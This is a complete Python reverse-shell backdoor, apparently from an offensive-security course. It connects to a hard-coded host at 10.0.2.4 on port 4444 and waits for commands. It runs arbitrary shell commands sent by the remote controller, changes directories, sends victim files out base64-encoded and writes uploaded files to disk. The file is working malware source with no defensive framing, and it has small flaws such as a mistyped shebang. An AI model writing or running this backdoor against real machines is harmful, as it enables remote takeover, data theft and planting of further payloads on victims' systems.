#!/usr/bun/env python

import socket
import subprocess
import json
import os
import base64 

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def reliable_rec(self):
		complete_data = ""
		while True:
			try:
				json_data = self.connection.recv(1024)
				json_data = json_data.decode("ASCII")
				complete_data = complete_data + json_data
				return json.loads(complete_data)
			except ValueError:
				continue
				
	def reliable_send(self, data):
		try:
			data = str(data, encoding='cp1252')
		except TypeError:
			data = data
		json_data = json.dumps(data)
		json_data = json_data.encode("UTF-8")
		self.connection.send(json_data)

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_directory_to(self, path):
		try:
			os.chdir(path)
			return "Changing working directory to " + path
		except OSError:
			return "Path is incorrect."
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
	def write_file(self, path, content):
		with open(path, "wb") as file:
			content = content.encode("UTF-8")
			file.write(base64.b64decode(content))
			return "[+] Upload successful."
	
	def run(self):
		while True:
			command = self.reliable_rec()
			if command[0] == "exit":
				self.connection.close()
				exit()

			elif command[0] == "cd" and len(command) > 1:
				command_result = self.change_working_directory_to(command [1])

			elif command[0] == "download":
				try:
					command_result = self.read_file(command[1])
				except FileNotFoundError:
					command_result = "The file was not found, try again"

			elif command[0] == "upload":
				command_result = self.write_file(command[1], command[2])

			elif (command[0] != "cd" or command[0] != "download" or command[0] != "exit" or command[0] != "upload"):
				try:
					command_result = self.execute_system_command(command)
				except:
					command_result = ('[-] Command could not execute.\n')

			self.reliable_send(command_result)

			

my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()

